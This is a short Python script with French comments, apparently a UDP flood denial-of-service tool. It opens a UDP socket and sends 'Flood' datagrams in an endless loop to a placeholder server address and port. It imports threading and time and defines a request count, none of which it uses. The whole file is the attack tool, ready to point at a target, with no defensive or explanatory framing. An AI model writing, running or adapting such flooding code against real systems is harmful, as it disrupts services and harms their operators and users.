import socket
import threading
import time

target_ip = "adresse_ip_de_votre_serveur"
target_port = 12345  # Port cible (ajustez en fonction de vos besoins)
num_requests = 100

def udp_flood():
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        client.sendto(b'Flood', (target_ip, target_port))
    except Exception as e:
        print(f"Error: {e}")

def main():
    while True:
        udp_flood()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("Script arrêté manuellement.")
